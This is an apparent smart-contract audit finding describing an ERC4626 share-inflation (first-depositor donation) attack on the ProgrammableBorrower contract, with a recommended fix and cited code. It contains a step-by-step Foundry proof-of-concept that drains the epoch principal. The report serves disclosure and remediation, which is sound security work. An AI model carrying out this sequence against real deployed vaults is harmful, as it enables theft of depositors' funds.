### Title
Unvalidated ERC4626 deposit lets a vault depositor steal epoch principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts an arbitrary ERC4626 vault and deposits epoch principal without checking that any shares were minted. If the configured vault is empty or controlled by the attacker, a first-depositor/donation transaction can inflate the share price immediately before the manager calls `startEpoch`, causing the borrower contract's deposit to mint zero shares. The attacker then redeems the sole vault share and takes both the donation and the pool's principal.

### Finding Description
`initialize` and `setVault` only validate that the vault address is nonzero and that its asset matches the CDO underlying; they do not require existing liquidity, a minimum share supply, or inflation-resistant share accounting. [1](#0-0) [2](#0-1) 

At epoch start, `onStartEpoch` snapshots `underlyingToken.balanceOf(address(this)) + _currentVaultAssets()` as `epochStartVaultAssets`, then deposits all on-hand cash into the ERC4626 vault. [3](#0-2)  `_depositToVault` stores the returned `shares` only in an event and does not enforce `shares > 0` or a minimum expected amount. [4](#0-3) 

A vulnerable ERC4626 with total supply `1` and donated assets `P + 1` computes `P * 1 / (P + 1) == 0` shares for the borrower's `P` deposit. Because `epochStartVaultAssets` was already snapshotted as `P`, accounting treats the stolen principal as an epoch vault loss rather than detecting that the deposit produced no vault position. [5](#0-4) 

### Impact Explanation
For a pool deposit `P`, the attacker contributes `1` wei to mint one vault share and donates `P` underlying to the vault. After the borrower's deposit mints zero shares, the vault contains approximately `2P + 1`, all redeemable by the attacker's single share. The attacker's net profit is approximately `P`, equal to the pool principal.

The borrower contract is left with no vault shares and no on-hand underlying. On a close-pool stop, `onStopEpoch` allows execution to continue when the requested shortfall exceeds vault assets, after which `IdleCDOEpochVariant.getFundsFromBorrower` fails and the CDO records a borrower default. [6](#0-5) [7](#0-6)  The resulting permanent loss is up to the full programmable-borrower principal deposited into the vault.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to have no economically meaningful existing shareholders and to lack first-depositor inflation protection. That precondition is realistic when a new vault is configured: `setVault` permits an empty replacement vault and performs no seed-deposit or share-mint validation. [2](#0-1) 

The attack is an ordering race around the honest manager's `startEpoch` transaction: the attacker first deposits one unit and donates enough assets to make the share price exceed the pool deposit, then redeems after `startEpoch` deposits the pool funds. No privileged role, malicious borrower, invalid oracle, or malicious CDO manager is required.

### Recommendation
Reject ERC4626 deposits that mint zero shares or fewer than a computed minimum:

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0 || shares < expectedShares - maxShareSlippage) {
    revert InvalidAmount();
}
```

Additionally, require newly configured vaults to have a minimum asset/share liquidity threshold or use vaults with explicit inflation protection such as virtual shares/assets and dead shares. `onStartEpoch` should also verify that `vault.balanceOf(address(this))` increased by the expected amount after depositing idle cash.

### Proof of Concept
This Foundry PoC assumes the programmable-borrower test deployment exposes the configured ERC4626 as `vault`, the programmable borrower as `programmableBorrower`, and the CDO as `cdoEpoch`.

```solidity
function testVaultInflationStealsEpochPrincipal() external {
    uint256 principal = 1_000_000 * oneScale;
    address attacker = makeAddr("vaultAttacker");

    // LP funds the CDO before the epoch starts.
    idleCDO.depositAA(principal);

    // The external ERC4626 is empty. The attacker becomes its sole shareholder
    // and donates enough assets to make one share worth more than `principal`.
    deal(defaultUnderlying, attacker, principal + 1);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(vault), 1);
    vault.deposit(1, attacker);
    IERC20Detailed(defaultUnderlying).transfer(address(vault), principal);
    vm.stopPrank();

    // Honest manager starts the epoch. ProgrammableBorrower deposits principal
    // into the inflated vault but receives zero shares.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.vaultSharesBalance(), 0);
    assertEq(programmableBorrower.epochStartVaultAssets(), principal);

    // The attacker redeems the only vault share and receives:
    // principal donation + stolen pool principal + the initial 1 wei deposit.
    uint256 attackerBefore = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(vault.balanceOf(attacker), attacker, attacker);
    assertGe(
        IERC20Detailed(defaultUnderlying).balanceOf(attacker) - attackerBefore,
        (2 * principal) + 1
    );

    // At epoch end, closing the pool cannot recover the principal and defaults.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 1);

    assertTrue(cdoEpoch.defaulted());
    assertEq(programmableBorrower.totalUnderlying(), 0);
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-168)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L205-223)
```text
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-346)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-385)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-405)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

```
